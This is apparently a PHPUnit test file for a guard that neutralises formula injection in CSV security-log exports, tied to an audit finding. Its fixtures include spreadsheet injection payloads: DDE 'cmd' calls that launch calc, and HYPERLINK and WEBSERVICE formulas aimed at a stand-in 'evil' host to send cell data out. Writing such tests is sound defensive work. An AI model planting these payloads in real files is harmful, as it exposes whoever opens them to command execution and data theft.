<?php

namespace App\Tests\Service;

use App\Service\CsvFormulaGuard;
use App\Service\SecurityLogCsvExporter;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * Injection de formules dans les exports CSV (audit 2026-11-20, P2).
 */
final class CsvFormulaGuardTest extends TestCase
{
    /** @return iterable<string, array{0: mixed, 1: mixed}> */
    public static function cells(): iterable
    {
        yield 'formule =' => ['=HYPERLINK("https://evil","x")', '\'=HYPERLINK("https://evil","x")'];
        yield 'formule +' => ['+cmd|\' /C calc\'!A0', "'+cmd|' /C calc'!A0"];
        yield 'formule -' => ['-2+3+cmd|\' /C calc\'!A0', "'-2+3+cmd|' /C calc'!A0"];
        yield 'formule @' => ['@SUM(1+1)*cmd', "'@SUM(1+1)*cmd"];
        yield 'tabulation' => ["\t=1+1", "'\t=1+1"];
        yield 'retour chariot' => ["\r=1+1", "'\r=1+1"];
        yield 'tabulation devant un nombre' => ["\t-1", "'\t-1"];
        yield 'email légitime' => ['alice@example.com', 'alice@example.com'];
        yield 'texte ordinaire' => ['Projet A', 'Projet A'];
        yield 'montant négatif' => ['-12.50', '-12.50'];
        yield 'montant' => ['1500.00', '1500.00'];
        yield 'entier' => [42, 42];
        yield 'null' => [null, null];
        yield 'chaîne vide' => ['', ''];
    }

    #[DataProvider('cells')]
    public function testCell(mixed $input, mixed $expected): void
    {
        self::assertSame($expected, CsvFormulaGuard::cell($input));
    }

    /** Bout en bout sur un vrai exporteur : un email tenté au login par un anonyme. */
    public function testExporterOutputContainsNoActiveFormula(): void
    {
        $exporter = new SecurityLogCsvExporter();
        $response = $exporter->stream('x.csv', ['Email'], [['=WEBSERVICE("https://evil/?"&A1)'], ['ok@example.com']]);

        ob_start();
        $response->sendContent();
        $csv = (string) ob_get_clean();

        foreach (preg_split('/\r?\n/', trim(substr($csv, 3))) ?: [] as $line) {
            $cell = str_getcsv($line, ';', '"', '')[0] ?? '';
            self::assertNotContains($cell[0] ?? '', ['=', '+', '-', '@', "\t", "\r"], "Cellule active : $cell");
        }
        self::assertStringContainsString("'=WEBSERVICE", $csv);
    }
}
